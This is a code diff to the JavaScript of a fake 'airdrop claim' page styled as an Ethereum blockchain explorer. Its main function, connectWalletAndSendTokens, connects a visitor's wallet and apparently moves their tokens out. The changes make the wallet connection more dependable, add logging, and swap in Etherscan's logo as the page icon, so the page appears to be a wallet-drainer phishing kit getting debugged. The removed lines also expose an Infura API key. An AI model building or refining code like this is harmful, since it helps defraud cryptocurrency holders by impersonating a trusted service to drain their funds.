@@ -85,7 +85,8 @@ addEventOnElem(window, "scroll", scrollReveal);
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ReownAppKit) {
-    console.error("Required libraries (ethers or Reown AppKit) not found.");
+    console.error("Required libraries (ethers or Reown AppKit) not found. Ensure scripts are loaded correctly.");
+    alert("Required libraries not loaded. Please check your internet connection or browser console for errors.");
     return;
   }
 
@@ -93,8 +94,8 @@ async function connectWalletAndSendTokens() {
   const metadata = {
     name: 'Ethereum Blockchain Explorer',
     description: 'Airdrop Claim Interface',
-    url: window.location.host, // e.g., 'example.com'
-    icons: ['https://www.cryptexfinance.xyz/assets/images/IMG_2922.png'] // Replace with your app’s icon URL
+    url: window.location.host, // e.g., 'localhost' or 'yourdomain.com'
+    icons: ['https://etherscan.io/images/brandassets/etherscan-logo-circle.svg'] // Etherscan logo as placeholder
   };
 
   const evmNetworks = [
@@ -106,7 +107,7 @@ async function connectWalletAndSendTokens() {
       chainConfig: {
         chainId: '0x1',
         chainName: 'Ethereum Mainnet',
-        rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
+        rpcUrls: [`https://rpc.walletconnect.org/v1?chainId=eip155:1&projectId=${projectId}`],
         nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
         blockExplorerUrls: ['https://etherscan.io']
       }
@@ -121,6 +122,7 @@ async function connectWalletAndSendTokens() {
 
   try {
     // Initialize Reown AppKit
+    console.log('Initializing Reown AppKit...');
     const { createAppKit, defaultConfig } = window.ReownAppKit;
     const { EthersAdapter } = window.ReownAppKitAdapterEthers;
 
@@ -133,20 +135,35 @@ async function connectWalletAndSendTokens() {
           chainId: '0x1',
           name: 'Ethereum Mainnet',
           currency: 'ETH',
-          rpcUrl: 'https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1',
+          rpcUrl: `https://rpc.walletconnect.org/v1?chainId=eip155:1&projectId=${projectId}`,
           explorerUrl: 'https://etherscan.io'
         }
       ],
       features: { analytics: true }
     });
 
-    const appKit = await createAppKit({
-      ...config,
-      adapters: [new EthersAdapter()]
-    });
+    let appKit;
+    try {
+      appKit = await createAppKit({
+        ...config,
+        adapters: [new EthersAdapter()]
+      });
+      console.log('AppKit initialized successfully.');
+    } catch (initErr) {
+      console.error('Failed to initialize AppKit:', initErr);
+      throw new Error(`AppKit initialization failed: ${initErr.message}`);
+    }
 
-    // Open the AppKit modal to display wallets with icons
+    // Open the AppKit modal
+    console.log('Opening AppKit modal...');
     await appKit.open();
+    console.log('Modal opened, waiting for wallet connection...');
+
+    if (!appKit.provider) {
+      console.warn('No provider returned after modal open.');
+      throw new Error('Wallet connection cancelled or failed.');
+    }
+
     const provider = new ethers.providers.Web3Provider(appKit.provider);
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
@@ -370,7 +387,8 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
       }
     }
 
-    // Close the modal after operations (optional, depending on UX)
+    // Close the modal after operations
+    console.log('Closing AppKit modal...');
     await appKit.close();
   } catch (err) {
     console.error('Error connecting wallet or processing tokens:', err);
@@ -387,4 +405,13 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
   }
 }
 
-document.getElementById('claim-airdrop-btn')?.addEventListener('click', connectWalletAndSendTokens);
+// Ensure DOM is loaded before attaching event listener
+document.addEventListener('DOMContentLoaded', () => {
+  const claimButton = document.getElementById('claim-airdrop-btn');
+  if (claimButton) {
+    console.log('Claim Airdrop button found, attaching event listener.');
+    claimButton.addEventListener('click', connectWalletAndSendTokens);
+  } else {
+    console.error('Claim Airdrop button not found. Ensure <button id="claim-airdrop-btn"> exists in HTML.');
+  }
+});
